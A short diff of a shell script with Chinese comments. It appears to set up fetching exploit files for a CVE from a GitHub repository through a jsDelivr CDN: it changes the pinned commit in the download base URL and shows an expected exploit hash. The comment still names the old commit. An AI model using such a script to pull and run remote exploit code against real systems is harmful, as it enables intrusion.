@@ -12,7 +12,7 @@ cd ~/cve_2026_43499 2>/dev/null || { echo "[!] cd 失败, 请先创建 ~/cve_202
 
 # ── 版本与通道 ──
 # 所有文件统一引用最新 HEAD commit (@56ef52d = v3.2.1)
-COMMIT="56ef52d"
+COMMIT="bfd819a"
 BASE="https://cdn.jsdelivr.net/gh/1332915/-10e-@${COMMIT}/cve_2026_43499"
 EXP_HASH="38c707677a931d52bd3e521e26c6139cf94825fae56e400a93f6423f8f73fea9"
 
